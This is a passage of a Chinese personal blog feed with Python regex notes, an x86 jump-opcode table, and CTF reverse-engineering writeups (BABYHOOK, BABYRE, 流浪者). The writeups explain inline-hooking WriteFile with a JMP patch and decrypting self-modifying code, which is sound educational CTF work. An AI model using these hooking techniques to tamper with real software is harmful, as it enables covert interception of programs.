        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>python中可以通过<code>import re</code>引入re模块，用正则表达式处理字符串</p><h2 id="一、正则表达式"><a href="#一、正则表达式" class="headerlink" title="一、正则表达式"></a>一、正则表达式</h2><p><strong>在线正则表达式测试工具：<a href="https://regex101.com/">https://regex101.com/</a></strong></p><h3 id="1、限定符"><a href="#1、限定符" class="headerlink" title="1、限定符"></a>1、限定符</h3><h4 id="匹配单字符"><a href="#匹配单字符" class="headerlink" title="匹配单字符"></a>匹配单字符</h4><p><strong>? 限定符</strong>：通过<code>used？</code>可匹配<code>use</code>或<code>used</code>,等含有<code>use</code>字样，<code>d</code>可有可无；</p><p>*<strong>限定符</strong>：通过<code>ab*c</code>可以匹配 <code>ac abc abbbbc</code>等含有n个b，ac必须按照顺序有的字符串；</p><p><strong>+限定符</strong>：即*限定符除去没有b的情况，<code>ab</code>不会被匹配；</p><p><strong>{n}限定符</strong>：<code>ab&#123;6&#125;c</code>可匹配b出现次数为6的情况，或者，{2,6}为2-6次，{2,}为两次以上</p><h4 id="匹配多字符"><a href="#匹配多字符" class="headerlink" title="匹配多字符"></a>匹配多字符</h4><p>使用 **()**框选所要匹配的字符，然后正常使用限定符。</p><h3 id="2、“或”运算符"><a href="#2、“或”运算符" class="headerlink" title="2、“或”运算符"></a>2、“或”运算符</h3><p>正则表达式要匹配 <code>acat</code>或者 <code>adog</code>时，可以使用或运算符，表达式如下：</p><p><code>a(cat|dog)</code></p><h3 id="3、字符类"><a href="#3、字符类" class="headerlink" title="3、字符类"></a>3、字符类</h3><p><strong>[] 匹配符</strong>：</p><p>如果想匹配ab三个字母组成的内容，可以使用 <code>[abc]+</code>;</p><p>其中<code>[]</code>用于限制匹配的字符；</p><p>在方括号中，我们可以指定范围，语法如 <code>[a-zA-Z]</code>即大小写所有英文字符；</p><p><strong>^匹配：</strong></p><p>和方括号联用，<code>[^0-9]+</code>代表非数字</p><h3 id="4、元字符"><a href="#4、元字符" class="headerlink" title="4、元字符"></a>4、元字符</h3><p>元字符是正则表达式预先定义好的内容</p><table><thead><tr><th>符号</th><th>释义</th><th>解释</th></tr></thead><tbody><tr><td>\d+</td><td>数字字符</td><td>等同于[0-9]</td></tr><tr><td>\w+</td><td>单词字符</td><td>英文、数字、下划线</td></tr><tr><td>\s+</td><td>空白符</td><td>TAB和换行符（空格）</td></tr><tr><td>\D+</td><td>非数字字符</td><td></td></tr><tr><td>\W+</td><td>非单词字符</td><td></td></tr><tr><td>\S+</td><td>非空白字符</td><td></td></tr><tr><td>\b</td><td>单词边界</td><td>\b的前一个字符和后一个字符不全是\w</td></tr><tr><td>.*</td><td>任意字符</td><td>不包含换行符</td></tr></tbody></table><p>注：</p><p>**+**为匹配多个连接的字符，而非一个一个单独匹配</p><table><thead><tr><th>特殊字符</th><th>释义</th><th>解释</th></tr></thead><tbody><tr><td>^</td><td>匹配行首</td><td>如^a,只会匹配行首的a，而非所有a</td></tr><tr><td>$</td><td>匹配行尾</td><td>如$a,只会匹配行尾的a，而非所有a</td></tr></tbody></table><h3 id="5、贪婪与懒惰匹配"><a href="#5、贪婪与懒惰匹配" class="headerlink" title="5、贪婪与懒惰匹配"></a>5、贪婪与懒惰匹配</h3><p>正则表达式默认使用的是贪婪匹配；</p><p>即，当出现较大的字符能被一次匹配时，忽略其包含的较小的字符，优先匹配较大的字符，试举一例，当我们尝试匹配html标签，匹配内容如下：<br><code>&lt;span&gt;&lt;b&gt;this is a text&lt;/b&gt;&lt;/span&gt;</code></p><p>我们可能会使用 <code>&lt;.+&gt;</code>进行匹配：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220123111221372.png" alt="image-20220123111221372"></p><p>正则默认选择了最贪婪的匹配方法。</p><p>我们可以手动切换贪婪匹配为懒惰匹配，使用 <code>&lt;.+?&gt;</code>进行匹配：<br><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220123111350484.png" alt="image-20220123111350484"></p><h3 id="6、优秀教程"><a href="#6、优秀教程" class="headerlink" title="6、优秀教程"></a>6、优秀教程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[详细文本教程]: https://deerchao.cn/tutorials/regex/regex.htm&quot;正则表达式30分钟入门教程&quot;</span><br><span class="line">[10分钟入门]: https://www.bilibili.com/video/BV1da4y1p7iZ?from=search&amp;amp;seid=5661918744314357020&amp;amp;spm_id_from=333.337.0.0&quot;10分钟快速掌握正则表达式&quot;</span><br></pre></td></tr></table></figure><h2 id="二、正则表达式的使用"><a href="#二、正则表达式的使用" class="headerlink" title="二、正则表达式的使用"></a>二、正则表达式的使用</h2><h4 id="1、"><a href="#1、" class="headerlink" title="1、. ^ $"></a>1、. ^ $</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.</td><td>abacad</td><td>abacad</td><td>匹配所有”a.”的字符</td></tr><tr><td>^a.</td><td>abacad</td><td>ab</td><td>只从开头匹配”a.”</td></tr><tr><td>a.$</td><td>abacad</td><td>ad</td><td>只匹配结尾的”a.$”</td></tr></tbody></table><h4 id="2、"><a href="#2、" class="headerlink" title="2、* + ? { }"></a>2、* + ? { }</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.?</td><td>abefacgad</td><td>ab ac ad</td><td>?表示重复零次或一次，即只匹配”a”后面一个任意字符。</td></tr><tr><td>a.*</td><td>abefacgad</td><td>abefacgad</td><td>*表示重复零次或多次，即匹配”a”后面0或多个任意字符。</td></tr><tr><td>a.+</td><td>abefacgad</td><td>abefacgad</td><td>+表示重复一次或多次，即只匹配”a”后面1个或多个任意字符。</td></tr><tr><td>a.{1,2}</td><td>abefacgad</td><td>abe acg ad</td><td>{1,2}匹配1到2次任意字符。</td></tr></tbody></table><p>注意：前面的*,+,?等都是贪婪匹配，也就是尽可能匹配，后面加?号使其变成惰性匹配</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a.*?</td><td>abefacgad</td><td>a a a</td><td>惰性匹配</td></tr></tbody></table><h4 id="3、字符集［］［-］"><a href="#3、字符集［］［-］" class="headerlink" title="3、字符集［］［^］"></a>3、字符集［］［^］</h4><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>a[befcgd]*</td><td>abefacgad</td><td>abef acg ad</td><td>表示匹配”a”后面[befcgd]的字符任意次`</td></tr><tr><td>a[^f]*</td><td>abefacgad</td><td>abe acgad</td><td>表示匹配一个不是”f”的字符任意次</td></tr><tr><td>[\d]</td><td>412a3bc</td><td>4 1 2 3</td><td>表示匹配任意一个数字，匹配到4个结果</td></tr><tr><td>[\d]+</td><td>412a3bc</td><td>412 3</td><td>表示匹配任意个数字，匹配到2个结果</td></tr></tbody></table><h4 id="4、分组-与-或-｜［-］"><a href="#4、分组-与-或-｜［-］" class="headerlink" title="4、分组 ()与 或 ｜［^］"></a>4、分组 ()与 或 ｜［^］</h4><p>　　身份证号码是一个长度为15或18个字符的字符串，如果是15位则全部由数字组成，首位不能为0；如果是18位，则前17位全部是数字，末位可能是数字或x，下面我们尝试用正则来表示：</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>^[1-9]\d{13,16}[0-9x]$</td><td>110101198001017032</td><td>110101198001017032</td><td>表示可以匹配一个正确的身份证号</td></tr><tr><td>^[1-9]\d{13,16}[0-9x]$</td><td>1101011980010170</td><td>1101011980010170</td><td>表示也可以匹配这串数字，但这并不是一个正确的身份证号码，它是一个16位的数字</td></tr><tr><td>^[1-9]\d{14}(\d{2}[0-9x])?$</td><td>1101011980010170</td><td>False</td><td>现在不会匹配错误的身份证号了()表示分组，将\d{2}[0-9x]分成一组，就可以整体约束他们出现的次数为0-1次</td></tr><tr><td>^([1-9]\d{16}[0-9x]|[1-9]\d{14})$</td><td>110105199812067023</td><td>110105199812067023</td><td>表示先匹配[1-9]\d{16}[0-9x]如果没有匹配上就匹配[1-9]\d{14}</td></tr></tbody></table><h4 id="5、转义符"><a href="#5、转义符" class="headerlink" title="5、转义符 \"></a>5、转义符 \</h4><p>　　在正则表达式中，有很多有特殊意义的是元字符，比如\n和\s等，如果要在正则中匹配正常的”\n”而不是”换行符”就需要对”&quot;进行转义，变成’\‘。</p><p>　　在python中，无论是正则表达式，还是待匹配的内容，都是以字符串的形式出现的，在字符串中\也有特殊的含义，本身还需要转义。所以如果匹配一次”\n”,字符串中要写成’\n’，那么正则里就要写成”\\n”,这样就太麻烦了。这个时候我们就用到了r’\n’这个概念，此时的正则是r’\n’就可以了。</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配 结果</th><th>说明</th></tr></thead><tbody><tr><td>\n</td><td>\n</td><td>False</td><td>因为在正则表达式中\是有特殊意义的字符，所以要匹配\n本身，用表达式\n无法匹配</td></tr><tr><td>\n</td><td>\n</td><td>True</td><td>转义\之后变成\，即可匹配</td></tr><tr><td>“\\n”</td><td>‘\n’</td><td>True</td><td>如果在python中，字符串中的’&#39;也需要转义，所以每一个字符串’&#39;又需要转义一次</td></tr><tr><td>r’\n’</td><td>r’\n’</td><td>True</td><td>在字符串之前加r，让整个字符串不转义</td></tr></tbody></table><h4 id="6、贪婪匹配"><a href="#6、贪婪匹配" class="headerlink" title="6、贪婪匹配"></a>6、贪婪匹配</h4><p>贪婪匹配：在满足匹配时，匹配尽可能长的字符串，默认情况下，采用贪婪匹配</p><table><thead><tr><th>正则</th><th>待匹配字符</th><th>匹配结果</th><th>说明</th></tr></thead><tbody><tr><td>&lt;.*&gt;</td><td><script>...<script></td><td><script>...<script></td><td>默认为贪婪匹配模式，会匹配尽量长的字符串</td></tr><tr><td>&lt;.*?&gt;</td><td><script>...<script></td><td><script> <script></td><td>加上？为将贪婪匹配模式转为非贪婪匹配模式，会匹配尽量短的字符串</td></tr></tbody></table><p>几个常用的非贪婪匹配Pattern</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*? 重复任意次，但尽可能少重复</span><br><span class="line">+? 重复1次或更多次，但尽可能少重复</span><br><span class="line">?? 重复0次或1次，但尽可能少重复</span><br><span class="line">&#123;n,m&#125;? 重复n到m次，但尽可能少重复</span><br><span class="line">&#123;n,&#125;? 重复n次以上，但尽可能少重复</span><br></pre></td></tr></table></figure><p>.*?的用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">. 是任意字符</span><br><span class="line">* 是取 0 至 无限长度</span><br><span class="line">? 是非贪婪模式。</span><br><span class="line">何在一起就是 取尽量少的任意字符，一般不会这么单独写，他大多用在：</span><br><span class="line">.*?x</span><br><span class="line">就是取前面任意长度的字符，直到一个x出现</span><br></pre></td></tr></table></figure><p>本部分摘自：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">博客园-iveBoy https://www.cnblogs.com/shenjianping/p/11647473.html Python之re模块</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-BABYHOOK-writeup</title>
      <link href="/2022/01/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYHOOK-writeup/"/>
      <url>/2022/01/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYHOOK-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-流浪者-writeup"><a href="#攻防世界Reverse进阶区-流浪者-writeup" class="headerlink" title="攻防世界Reverse进阶区-流浪者-writeup"></a>攻防世界Reverse进阶区-流浪者-writeup</h1><p>本题为较为基础的Hook题，通过本writeup来整理一下思路。</p><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122143740757.png" alt="image-20220122143740757"></p><p>进入程序，首先确定<code>flag</code>字符串长度为<strong>19</strong>；</p><p>然后发现程序会将输入内容写入文件名为文件<strong>Your_input</strong>的文件；</p><p>最后通过核验<strong>NumberOfBytesWritten</strong>变量是否为1来控制输出；</p><p>此时，若进入<strong>sub_401240</strong>函数就会中计，需手动进行测试。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122144439005.png" alt="image-20220122144439005"></p><p>手动测试后发现输出文件中的内容和输入完全不同，推测可能在<strong>sub_401220</strong>函数中对输入进行了加密。</p><h2 id="sub-401220函数："><a href="#sub-401220函数：" class="headerlink" title="sub_401220函数："></a>sub_401220函数：</h2><p>进入<strong>sub_401220</strong>函数：（为<code>hook</code>关键函数）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122144907695.png" alt="image-20220122144907695"></p><p>其主要内容如下（1~14行）：</p><blockquote><p>获取当前进程号，打开进程到hprocess,libfilename为一常量kernel32.dll，procname为一常量writefile,故dword_409c4（*WriteFile_0位置)、lpaddress所存为writefile的地址，然后程序复制了lpaddress的地址到unk_40c9b4。</p></blockquote><p>然后开始hook操作（15、16行）：</p><p>可以看到第15行有一常量被存入地址<code>40C9BC</code>，H键转化为十六进制 <strong>0xE9</strong></p><p>然后在地址<code>40C9BD</code>存入了函数<code>sub_401080</code>与IpAdress的距离再减去5，即<code>sub_401080</code>与WriteFile函数的距离。</p><p>总结来说，将writeFile函数的前五个字节替换为了跳转到<code>sub_401080</code>的语句。</p><p>回到main函数后，在调用<code>WriteFile</code>函数时，实际调用的是<code>sub_401080</code>，因此进入<code>sub_401080</code>：</p><h2 id="sub-401080函数："><a href="#sub-401080函数：" class="headerlink" title="sub_401080函数："></a>sub_401080函数：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122152116398.png" alt="image-20220122152116398"></p><p>可以看到，此函数内容为，先调用<code>sub_401000</code>，返回值V5；</p><p>然后再在内部调用WriteFile函数；</p><p>最终根据V5的值，判断第四个指针参数<em>lpNumberOfBytesWritten的值，此处的</em>lpNumberOfBytesWritten参数，即对应main函数中的NumberOfBytesWritten关键参数。</p><p>因此，推测<code>sub_401000</code>函数为对于输入的核心判断函数，步入查看：</p><h2 id="sub-401000函数："><a href="#sub-401000函数：" class="headerlink" title="sub_401000函数："></a>sub_401000函数：</h2><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122153313662.png" alt="image-20220122153313662"></p><p>输入为a1；a2为固定值19；</p><p>然后下面的逻辑简单的说就是先加密a1，然后比较数组a1每一位的值和储存在 <strong>byte_40A030</strong>处每一位的值。</p><p>直接逆向分析函数思路，发现奇数位是通过本位推导，但偶数位是通过高位推导，因此第0位是无法被推导出的，而18位可以被推导出两次:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220122164546365.png" alt="image-20220122164546365"></p><p>脚本如上：猜测第一位是<code>f</code>字符，最终正确。</p><h2 id="汇编跳转函数的总结："><a href="#汇编跳转函数的总结：" class="headerlink" title="汇编跳转函数的总结："></a>汇编跳转函数的总结：</h2><p><a href="https://lhl7.github.io/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/">https://lhl7.github.io/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编跳转指令及其十六进制码</title>
      <link href="/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/22/%E6%B1%87%E7%BC%96%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="汇编跳转指令及其十六进制码"><a href="#汇编跳转指令及其十六进制码" class="headerlink" title="汇编跳转指令及其十六进制码"></a>汇编跳转指令及其十六进制码</h1><p>几种跳转指令和对应的机器码：<br>0xE8 CALL后面的四个字节是地址<br>0xE9 JMP后面的四个字节是偏移<br>0xEB JMP后面的二个字节是偏移<br>0xFF15 CALL后面的四个字节是存放地址的地址<br>0xFF25 JMP后面的四个字节是存放地址的地址<br>0x68 PUSH后面的四个字节入栈<br>0x6AP USH后面的一个字节入栈</p><p>————————————————<br>版权声明：本文为CSDN博主「hincon」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/ccworm/article/details/112787439">https://blog.csdn.net/ccworm/article/details/112787439</a></p>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-BABYRE-writeup</title>
      <link href="/2022/01/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYRE-writeup/"/>
      <url>/2022/01/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-BABYRE-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-BABYRE-writeup"><a href="#攻防世界Reverse进阶区-BABYRE-writeup" class="headerlink" title="攻防世界Reverse进阶区-BABYRE-writeup"></a>攻防世界Reverse进阶区-BABYRE-writeup</h1><p>以此篇WP记录第一次使用ida解决smc（自解密）</p><p>观察反汇编代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144411257.png" alt="image-20220118144411257"></p><p>第12行调用的函数在第8行被加密了</p><p>因此，需要手动解密观察，双击judge进入：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144605050.png" alt="image-20220118144605050"></p><p>然后使用idapython脚本解决，右上角file、script command</p><p>如图编写代码：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118144725867.png" alt="image-20220118144725867"></p><p>点击run，可以看到内容被改变：</p><p>选中judge函数一行，c（code），将其变成代码，这时的judge被分为三个函数，我们将其合三为1，框选地址<code>B00~BB5</code>（所有红色区域），p（重新生成function）</p><p>此时可以在左侧找到相应函数内容，F5即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220118145127875.png" alt="image-20220118145127875"></p><p>然后针对反汇编后的加密算法写一个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">v2=[<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="number">127</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">an=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">14</span>):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">4</span>:</span><br><span class="line">        an+=<span class="built_in">chr</span>(<span class="number">127</span>^i)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    an+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(v2[i])^i)</span><br><span class="line"><span class="built_in">print</span>(an)</span><br></pre></td></tr></table></figure><p>运行结果为：flag{n1c3_j0b}</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界Reverse进阶区-流浪者-writeup</title>
      <link href="/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-%E6%B5%81%E6%B5%AA%E8%80%85-writeup/"/>
      <url>/2022/01/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CReverse%E8%BF%9B%E9%98%B6%E5%8C%BA-%E6%B5%81%E6%B5%AA%E8%80%85-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界Reverse进阶区-流浪者-writeup"><a href="#攻防世界Reverse进阶区-流浪者-writeup" class="headerlink" title="攻防世界Reverse进阶区-流浪者-writeup"></a>攻防世界Reverse进阶区-流浪者-writeup</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123155980.png" alt="image-20220117123155980"></p><p><strong>关键函数1：sub_401890</strong></p><p>调用了另一个函数</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123309787.png" alt="image-20220117123309787"></p><p><strong>关键函数2：sub_4017F0</strong></p><p>先传入关键函数1进行加密，加密后进入函数2进行进一步加密，最后与<code>kanXue...</code>字符串对比查验</p><p>逆向脚本书写逻辑即可</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123519559.png" alt="image-20220117123519559"></p><p>最终运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220117123544490.png" alt="image-20220117123544490"></p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python数据类型以及常用函数（基础）</title>
      <link href="/2022/01/16/python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2022/01/16/python%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BB%A5%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="python笔记"><a href="#python笔记" class="headerlink" title="python笔记"></a>python笔记</h1><p>Python3 中有六个标准的数据类型：</p><ul><li>Number（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Set（集合）</li><li>Dictionary（字典）</li></ul><p>Python3 的六个标准数据类型中：</p><ul><li><p><strong>不可变数据（3 个）：</strong>Number（数字）、String（字符串）、Tuple（元组）；</p></li><li><p><strong>可变数据（3 个）：</strong>List（列表）、Dictionary（字典）、Set（集合）。</p></li><li><h2 id="Python数据类型转换"><a href="#Python数据类型转换" class="headerlink" title="Python数据类型转换"></a>Python数据类型转换</h2><p>有时候，我们需要对数据内置的类型进行转换，数据类型的转换，你只需要将数据类型作为函数名即可，在下一章节 <a href="https://www.runoob.com/python3/python3-type-conversion.html">Python3 数据类型转换</a> 会具体介绍。</p><p>以下几个内置的函数可以执行数据类型之间的转换。这些函数返回一个新的对象，表示转换的值。</p><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">[int(x <a href="https://www.runoob.com/python3/python-func-int.html">,base])</a></td><td align="left">将x转换为一个整数</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-float.html">float(x)</a></td><td align="left">将x转换到一个浮点数</td></tr><tr><td align="left">[complex(real <a href="https://www.runoob.com/python3/python-func-complex.html">,imag])</a></td><td align="left">创建一个复数</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-str.html">str(x)</a></td><td align="left">将对象 x 转换为字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-repr.html">repr(x)</a></td><td align="left">将对象 x 转换为表达式字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-eval.html">eval(str)</a></td><td align="left">用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-func-tuple.html">tuple(s)</a></td><td align="left">将序列 s 转换为一个元组</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python3-att-list-list.html">list(s)</a></td><td align="left">将序列 s 转换为一个列表</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-set.html">set(s)</a></td><td align="left">转换为可变集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-dict.html">dict(d)</a></td><td align="left">创建一个字典。d 必须是一个 (key, value)元组序列。</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-frozenset.html">frozenset(s)</a></td><td align="left">转换为不可变集合</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-chr.html">chr(x)</a></td><td align="left">将一个整数转换为一个字符</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-ord.html">ord(x)</a></td><td align="left">将一个字符转换为它的整数值</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-hex.html">hex(x)</a></td><td align="left">将一个整数转换为一个十六进制字符串</td></tr><tr><td align="left"><a href="https://www.runoob.com/python3/python-func-oct.html">oct(x)</a></td><td align="left">将一个整数转换为一个八进制字符串</td></tr></tbody></table></li></ul><h2 id="一、字符串"><a href="#一、字符串" class="headerlink" title="一、字符串"></a>一、字符串</h2><p>与 C 字符串不同的是，Python 字符串不能被改变。向一个索引位置赋值，比如word[0] = ‘m’会导致错误。</p><p>Python 的字符串常用内建函数如下：</p><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-capitalize.html">capitalize()</a> 将字符串的第一个字符转换为大写</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-center.html">center(width, fillchar)</a>返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-count.html">count(str, beg= 0,end=len(string))</a> 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-decode.html">bytes.decode(encoding=”utf-8”, errors=”strict”)</a> Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-encode.html">encode(encoding=’UTF-8’,errors=’strict’)</a> 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-endswith.html">endswith(suffix, beg=0, end=len(string))</a> 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-expandtabs.html">expandtabs(tabsize=8)</a> 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-find.html">find(str, beg=0, end=len(string))</a> 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-index.html">index(str, beg=0, end=len(string))</a> 跟find()方法一样，只不过如果str不在字符串中会报一个异常。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalnum.html">isalnum()</a> 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalpha.html">isalpha()</a> 如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdigit.html">isdigit()</a> 如果字符串只包含数字则返回 True 否则返回 False..</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-islower.html">islower()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isnumeric.html">isnumeric()</a> 如果字符串中只包含数字字符，则返回 True，否则返回 False</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isspace.html">isspace()</a> 如果字符串中只包含空白，则返回 True，否则返回 